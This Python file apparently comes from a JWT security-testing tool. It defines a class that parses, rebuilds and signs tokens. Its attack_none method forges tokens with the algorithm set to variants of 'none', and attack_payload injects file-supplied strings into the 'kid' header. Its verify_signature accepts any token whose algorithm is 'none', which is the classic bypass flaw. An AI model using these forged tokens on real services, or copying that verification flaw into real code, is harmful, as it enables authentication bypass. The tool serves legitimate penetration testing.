import hashlib
import hmac
import json
import signatures
import requests

from jwt import utils


class TestJWT:
    """
    Contains JWT under test and related key material
    """

    def __init__(self):
        self.is_json = True
        self.header = {}
        self.payload = {}

    def get_payload(self):
        if self.is_json:
            return self.payload
        return self.payload['default']

    def set_payload(self, payload):
        if TestJWT.is_dict(payload):
            self.payload = payload
        else:
            self.is_json = False
            self.payload = {"default": payload}

    @staticmethod
    def is_dict(text):
        if isinstance(text, dict):
            return True
        else:
            return False

    @staticmethod
    def split_jwt(ser_token):
        return ser_token.split(".", 3)

    @staticmethod
    def deserialize(ser_token):
        tok1, tok2, sig = TestJWT.split_jwt(ser_token)
        #print("header {}".format(tok1))
        #print("payload {}".format(tok2))
        #print("sig {}".format(sig))
        head = utils.base64url_decode(tok1)
        payload = utils.base64url_decode(tok2)
        jwt = TestJWT()
        jwt.original_jwt = ser_token;

        # noinspection PyBroadException
        try:
            jwt.header = json.loads(head)
            jwt_payload = json.loads(payload)
            jwt.set_payload(jwt_payload)
        except:
            jwt.set_payload(utils.force_unicode(payload))
        return jwt

    def show_token(self):
        print("\nIs JSON: {}".format(self.is_json))
        print("\nToken header:")
        print(json.dumps(self.header, indent=4, ensure_ascii=True))
        for i in self.header:
            "-> {} = {}".format(i, self.header[i])

        print("\nToken payload:")
        if self.is_json:
            print(json.dumps(self.get_payload(), indent=4, ensure_ascii=True))
            for i in self.get_payload():
                print("-> {} = {}".format(i, self.get_payload()[i]))
        else:
            print(self.get_payload())

    def get_algorithm(self):
        return self.header['alg']

    def set_algorithm(self, new_alg):
        self.header['alg'] = new_alg

    @staticmethod
    def build_section(dict_section):
        if TestJWT.is_dict(dict_section):
            new_section = utils.base64url_encode(utils.force_bytes(json.dumps(dict_section, separators=(",", ":"))))
        else:
            new_section = utils.base64url_encode(utils.force_bytes(dict_section))
        return new_section

    def build_token_without_signature(self):
        return TestJWT.build_section(self.header) + utils.force_bytes('.') + TestJWT.build_section(self.payload)

    def build_token(self, key=None):
        content_to_sign = self.build_token_without_signature()
        return content_to_sign + utils.force_bytes('.') + signatures.sign(self.get_algorithm(), content_to_sign, key=key)

    def verify_signature(self, key, expected_sig):
        alg = self.header['alg']
        print("Verify signature using alg {}".format(alg))
        if alg is None:
            print("Signature algorithm not set")
            return False
        if str.capitalize(alg) == "NONE":
            return True
        alg = self.get_algorithm()
        return signatures.verify(alg, self.build_token_without_signature(), key, utils.force_bytes(expected_sig))

    def compute_signature(self, key):
        alg = self.get_algorithm()
        print("Computing signature using alg {}".format(alg))
        if alg is None:
            print("Signature algorithm not set")
            return False
        if str.capitalize(alg) == "NONE":
            return self.build_token_without_signature()
        content_to_sign = utils.base64url_encode(utils.force_bytes(json.dumps(self.header, separators=(",",":")))) + utils.force_bytes(".") + utils.base64url_encode(utils.force_bytes(json.dumps(self.payload, separators=(",",":"))))
        return signatures.sign(alg, content_to_sign, key=key)

    def attack_none(self):
        payloads = {}

        self.set_algorithm('none')
        payloads['attack_alg_none'] = utils.force_unicode(self.build_token())

        self.set_algorithm('None')
        payloads['attack_alg_None'] = utils.force_unicode(self.build_token())

        self.set_algorithm('NONE')
        payloads['attack_alg_NONE'] = utils.force_unicode(self.build_token())

        return payloads

    @staticmethod
    def read_file(file: str, joinlines=False):
        if file.lower().startswith("https://"):
            key_list = requests.get(file, verify=True).text.splitlines()
        else:
            with open(file, "r") as f:
                key_list = f.readlines()
        key_list = [x.replace('\n','').strip() for x in key_list]
        if joinlines:
            return "".join(key_list)
        return key_list

    @staticmethod
    def inject_in_json(header: dict, payload: str):
        key = header['kid']
        if key is not None:
            header['kid'] = payload
        return TestJWT.build_section(header)

    @staticmethod
    def attack_payload(serial_jwt: str, payload_file: str):
        lines = TestJWT.read_file(payload_file, joinlines=False)
        header, payload, signature = serial_jwt.split(".")
        header = json.loads(utils.base64url_decode(header))
        payloads = [TestJWT.inject_in_json(header, line) for line in lines]
        attacks = {}
        for index, attack_payload in zip(range(1, payload.__len__()), payloads):
            attacks["attack_payload_{}".format(index)] = ".".join([utils.force_unicode(attack_payload), payload, signature])
        return attacks
